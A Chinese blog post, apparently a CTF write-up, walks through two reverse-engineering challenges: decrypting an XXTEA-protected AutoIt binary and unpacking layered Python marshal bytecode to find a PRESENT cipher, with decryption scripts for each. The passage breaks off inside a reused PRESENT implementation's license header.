<!DOCTYPE html>
<html lang="en">
    <!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>DASCTF2023 X CBCTF - P.Z&#39;s Blog</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/waline.css">

  
  
  
<link rel="stylesheet" href="/css/post.css">

  

  
    
<script src="https://cdn.jsdelivr.net/npm/js-cookie@rc/dist/js.cookie.min.js"></script>
 
  

    <script src='//cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js'></script>

<meta name="generator" content="Hexo 6.0.0"></head>

<!-- //unpkg.com/@waline/client -->
<!--  -->
    <body data-color-scheme="auto">
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">P.Z&#39;s Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/Diary/Diary">Diary</a>
            
            
            
            <a class="nav-item" href="/Friends/Friends">Friends</a>
            
            
            
            <a class="nav-item" href="/CTF/CTF">CTF</a>
            
            
            
            <a class="nav-item" href="/Book/Book">Book</a>
            
            
            
            <a class="nav-item" href="/Sundry/Sundry">Sundry</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/PoZeep" target="_blank">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://space.bilibili.com/39892350" target="_blank">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        <article class="post">
    <div class="meta">
        
        <div class="date" id="date">
            
            
            
            
            
            
            
            
            
            
            <span>October</span>
            
            
            
            <span>24,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">DASCTF2023 X CBCTF</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p>（真的好久没写WP了.jpg）</p>
<h1 id="DASCTF2023-X-CBCTF"><a href="#DASCTF2023-X-CBCTF" class="headerlink" title="DASCTF2023 X CBCTF"></a>DASCTF2023 X CBCTF</h1><h2 id="auuuu3"><a href="#auuuu3" class="headerlink" title="auuuu3"></a>auuuu3</h2><h3 id="0x00-Daily-Shell-Check"><a href="#0x00-Daily-Shell-Check" class="headerlink" title="0x00 Daily Shell Check"></a>0x00 Daily Shell Check</h3><p>无壳32位，但autoit</p>
<p><img src="/DASCTF2023-X-CBCTF/image-20231024135821162.png" alt="image-20231024135821162"></p>
<h3 id="0x01-ReComplie"><a href="#0x01-ReComplie" class="headerlink" title="0x01 ReComplie"></a>0x01 ReComplie</h3><p>找工具.jpg，最后尝试几种了几种发现52上的一个最好用</p>
<p><img src="/DASCTF2023-X-CBCTF/image-20231024140306100.png" alt="image-20231024140306100"></p>
<p>稍微浏览不难发现加密函数</p>
<p><img src="/DASCTF2023-X-CBCTF/image-20231024140407983.png" alt="image-20231024140407983"></p>
<p>加密函数在这，把这些弄到ida里，反编译会发现是个XXTEA</p>
<p><img src="/DASCTF2023-X-CBCTF/image-20231024140450531.png" alt="image-20231024140450531"></p>
<h3 id="0x02-Get-Flag"><a href="#0x02-Get-Flag" class="headerlink" title="0x02 Get Flag"></a>0x02 Get Flag</h3><p>没魔改，直接解密即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">import</span> binascii</span></span><br><span class="line"><span class="function">from ctypes <span class="keyword">import</span> *</span></span><br><span class="line"><span class="function"><span class="keyword">import</span> struct</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">MX</span><span class="params">(z, y, total, key, p, e)</span>:</span></span><br><span class="line"><span class="function">    temp1 </span>= (z.value &gt;&gt; <span class="number">5</span> ^ y.value &lt;&lt; <span class="number">2</span>) + (y.value &gt;&gt; <span class="number">3</span> ^ z.value &lt;&lt; <span class="number">4</span>)</span><br><span class="line">    temp2 = (total.value ^ y.value) + (key[(p &amp; <span class="number">3</span>) ^ e.value] ^ z.value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c_uint32(temp1 ^ temp2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt(n, v, key):</span><br><span class="line">    delta = <span class="number">0x61C88647</span></span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> <span class="comment">// n</span></span><br><span class="line"></span><br><span class="line">    total = c_uint32(-rounds * delta)</span><br><span class="line">    y = c_uint32(v[<span class="number">0</span>])</span><br><span class="line">    e = c_uint32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> rounds &gt; <span class="number">0</span>:</span><br><span class="line">        e.value = (total.value &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p in range(n - <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">            z = c_uint32(v[p - <span class="number">1</span>])</span><br><span class="line">            v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value</span><br><span class="line">            y.value = v[p]</span><br><span class="line">        z = c_uint32(v[n - <span class="number">1</span>])</span><br><span class="line">        v[<span class="number">0</span>] = c_uint32(v[<span class="number">0</span>] - MX(z, y, total, key, <span class="number">0</span>, e).value).value</span><br><span class="line">        y.value = v[<span class="number">0</span>]</span><br><span class="line">        total.value += delta</span><br><span class="line">        rounds -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ct = <span class="string">&quot;7218181A02F79F4B5773E8FFE83FE732DF96259FF2B86AAB945468A132A83D83CF9D750E316C8675&quot;</span></span><br><span class="line">    ct = binascii.a2b_hex(ct)</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    key = <span class="string">&quot;Wowww111auUu3&quot;</span></span><br><span class="line">    v = struct.unpack(<span class="string">&#x27;&lt;10I&#x27;</span>, ct)</span><br><span class="line">    k = struct.unpack(<span class="string">&#x27;&lt;4I&#x27;</span>, key.encode() + b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span> * <span class="number">3</span>)</span><br><span class="line">    v = <span class="built_in">list</span>(v)</span><br><span class="line">    k = <span class="built_in">list</span>(k)</span><br><span class="line">    n = <span class="number">10</span></span><br><span class="line">    res = decrypt(n, v, k)</span><br><span class="line">    <span class="keyword">for</span> r in res:</span><br><span class="line">        print(r.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>).decode(), end=<span class="string">&#x27;&#x27;)</span></span><br></pre></td></tr></table></figure>





<h2 id="marshal"><a href="#marshal" class="headerlink" title="marshal"></a>marshal</h2><h3 id="0x00-Daily-Shell-Check-1"><a href="#0x00-Daily-Shell-Check-1" class="headerlink" title="0x00 Daily Shell Check"></a>0x00 Daily Shell Check</h3><p>py源码文件</p>
<h3 id="0x01-ReComplie-1"><a href="#0x01-ReComplie-1" class="headerlink" title="0x01 ReComplie"></a>0x01 ReComplie</h3><p>一共七层慢慢反编译就可以得到所有汇编</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line">code = <span class="string">b&#x27;...&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line">l = marshal.loads(code)</span><br><span class="line">dis.dis(l)</span><br><span class="line"><span class="comment">#exec(l)</span></span><br></pre></td></tr></table></figure>

<p>继续</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal, dis</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addRoundKey</span>(<span class="params">state, roundkey</span>):</span></span><br><span class="line">    <span class="keyword">return</span> state ^ roundkey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sBoxLayer</span>(<span class="params">state</span>):</span></span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        output += Sbox[(state &gt;&gt; (<span class="number">4</span> * i)) &amp; <span class="number">0x0F</span>] &lt;&lt; (<span class="number">4</span> * i)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">desBoxLayer</span>(<span class="params">state</span>):</span></span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        output |= Sbox_inv[(state &gt;&gt; (<span class="number">4</span> * i)) &amp; <span class="number">0x0F</span>] &lt;&lt; (<span class="number">4</span> * i)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pLayer</span>(<span class="params">state</span>):</span></span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        output += ((state &gt;&gt; i) &amp; <span class="number">0x01</span>) &lt;&lt; Pbox[i]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">depLayer</span>(<span class="params">state</span>):</span></span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        output |= ((state &gt;&gt; i) &amp; <span class="number">0x01</span>) &lt;&lt; Pbox_inv[i]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">string2number</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(<span class="built_in">ord</span>(c) &lt;&lt; (<span class="number">8</span> * i) <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(s))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateRoundkeys80</span>(<span class="params">key, rounds</span>):</span></span><br><span class="line">    roundkeys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds + <span class="number">1</span>):</span><br><span class="line">        roundkeys.append(key &gt;&gt; <span class="number">16</span>)</span><br><span class="line">        key = ((key &amp; <span class="number">0x7FFFFF</span>) &lt;&lt; <span class="number">61</span>) + (key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">        key ^= Sbox[(key &gt;&gt; <span class="number">76</span>) &amp; <span class="number">0x0F</span>] &lt;&lt; <span class="number">76</span></span><br><span class="line">        key += (key &gt;&gt; <span class="number">15</span>)</span><br><span class="line">    <span class="keyword">return</span> roundkeys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Sbox = [</span><br><span class="line">    <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">]</span><br><span class="line">Pbox = [</span><br><span class="line">    <span class="number">0</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">33</span>, <span class="number">49</span>, <span class="number">2</span>, <span class="number">18</span>, <span class="number">34</span>, <span class="number">50</span>, <span class="number">3</span>, <span class="number">19</span>, <span class="number">35</span>, <span class="number">51</span>,</span><br><span class="line">    <span class="number">4</span>, <span class="number">20</span>, <span class="number">36</span>, <span class="number">52</span>, <span class="number">5</span>, <span class="number">21</span>, <span class="number">37</span>, <span class="number">53</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">38</span>, <span class="number">54</span>, <span class="number">7</span>, <span class="number">23</span>, <span class="number">39</span>, <span class="number">55</span>,</span><br><span class="line">    <span class="number">8</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">56</span>, <span class="number">9</span>, <span class="number">25</span>, <span class="number">41</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">26</span>, <span class="number">42</span>, <span class="number">58</span>, <span class="number">11</span>, <span class="number">27</span>, <span class="number">43</span>, <span class="number">59</span>,</span><br><span class="line">    <span class="number">12</span>, <span class="number">28</span>, <span class="number">44</span>, <span class="number">60</span>, <span class="number">13</span>, <span class="number">29</span>, <span class="number">45</span>, <span class="number">61</span>, <span class="number">14</span>, <span class="number">30</span>, <span class="number">46</span>, <span class="number">62</span>, <span class="number">15</span>, <span class="number">31</span>, <span class="number">47</span>, <span class="number">63</span></span><br><span class="line">]</span><br><span class="line">Sbox_inv = [Sbox.index(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">Pbox_inv = [Pbox.index(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dis_print</span>(<span class="params">code_Data</span>):</span></span><br><span class="line">    code = marshal.loads(code_Data)</span><br><span class="line">    dis.dis(code)</span><br><span class="line"></span><br><span class="line">code1_data = <span class="string">b&#x27;...&#x27;</span></span><br><span class="line"><span class="comment">#dis_print(code1_data)</span></span><br><span class="line">code2_data = <span class="string">b&#x27;...&#x27;</span></span><br><span class="line"><span class="comment">#dis_print(code2_data)</span></span><br><span class="line">code3_data = <span class="string">b&#x27;...&#x27;</span></span><br><span class="line"><span class="comment">#dis_print(code3_data)</span></span><br><span class="line">code4_data = <span class="string">b&#x27;...&#x27;</span></span><br><span class="line"><span class="comment">#dis_print(code4_data)</span></span><br><span class="line">code5_data = <span class="string">b&#x27;...&#x27;</span></span><br><span class="line">dis_print(code5_data)</span><br><span class="line">code6_data = <span class="string">b&#x27;...&#x27;</span></span><br><span class="line"><span class="comment">#dis_print(code6_data)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">blocks</span>):</span></span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    roundkeys = generateRoundkeys80(<span class="number">85354531916197809168417</span>, rounds)</span><br><span class="line">    out = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">        state = string2number(block)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds - <span class="number">1</span>):</span><br><span class="line">            state = addRoundKey(state, roundkeys[i])</span><br><span class="line">            state = sBoxLayer(state)</span><br><span class="line">            state = pLayer(state)</span><br><span class="line">        cipher = addRoundKey(state, roundkeys[-<span class="number">1</span>])</span><br><span class="line">        out.append(cipher)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">cipher</span>):</span></span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    roundkeys = generateRoundkeys80(<span class="number">85354531916197809168417</span>, rounds)</span><br><span class="line">    out = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> cipher:</span><br><span class="line">        state = addRoundKey(block, roundkeys[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds - <span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            state = depLayer(state)  <span class="comment"># 置换层</span></span><br><span class="line">            state = desBoxLayer(state)  <span class="comment"># S盒层</span></span><br><span class="line">            state = addRoundKey(state, roundkeys[i])</span><br><span class="line"></span><br><span class="line">        out.append(state)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># inp = input(&#x27;pls input ur flag: &#x27;)</span></span><br><span class="line"><span class="comment"># if len(inp) != 32:</span></span><br><span class="line"><span class="comment">#     print(&#x27;wrong flag!&#x27;)</span></span><br><span class="line"><span class="comment">#     exit(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#blocks = [inp[0:8], inp[8:16], inp[16:24], inp[24:32]]  # 切分输入为 4 个块</span></span><br><span class="line"></span><br><span class="line">cmps = [<span class="number">120617461261311902</span>, <span class="number">16357837616839286114</span>, <span class="number">312508749794633008</span>, <span class="number">1843701600916795272</span>]</span><br><span class="line"><span class="comment">#out_blocks = encrypt(blocks)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(4):</span></span><br><span class="line"><span class="comment">#     if cmps[i] != out_blocks[i]:</span></span><br><span class="line"><span class="comment">#         print(&#x27;wrong flag!&#x27;)</span></span><br><span class="line"><span class="comment">#         exit(0)</span></span><br></pre></td></tr></table></figure>

<p>懒了，基本都是gpt帮我翻译的汇编，然而根本是识别成依托，我以为是作者写的加密，但没想到是标准加密，Present，学习了，其实这么多常量和密钥的生成名字，已经很好找到到底是什么加密了</p>
<h3 id="0x02-Get-Flag-1"><a href="#0x02-Get-Flag-1" class="headerlink" title="0x02 Get Flag"></a>0x02 Get Flag</h3><p>网上找到一共古老的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="comment"># Python PRESENT implementation</span></span><br><span class="line"><span class="comment"># Version: 1.0</span></span><br><span class="line"><span class="comment"># Date: 13/10/2008</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Copyright (c) 2008 Christophe Oosterlynck (christophe.oosterlynck@gmail.com)</span></span><br><span class="line"><span class="comment">#                    Philippe Teuwen (philippe.teuwen@nxp.com)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Permission is hereby granted, free of charge, to any person obtaining a copy</span></span><br><span class="line"><span class="comment"># of this software and associated documentation files (the &quot;Software&quot;), to deal</span></span><br><span class="line"><span class="comment"># in the Software without restriction, including without limitation the rights</span></span><br><span class="line"><span class="comment"># to use, copy, modify, merge, publish, distribute, sublicense, and/or sell</span></span><br><span class="line"><span class="comment"># copies of the Software, and to permit persons to whom the Software is</span></span><br><span class="line"><span class="comment"># furnished to do so, subject to the following conditions:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The above copyright notice and this permission notice shall be included in</span></span><br><span class="line"><span class="comment"># all copies or substantial portions of the Software.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</span></span><br><span class="line"><span class="comment"># IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</span></span><br><span class="line"><span class="comment"># FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</span></span><br><span class="line"><span class="comment"># AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</span></span><br><span class="line"><span class="comment"># LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,</span></span><br><span class="line"><span class="comment"># OUT OF OR IN CONNECTION WITH 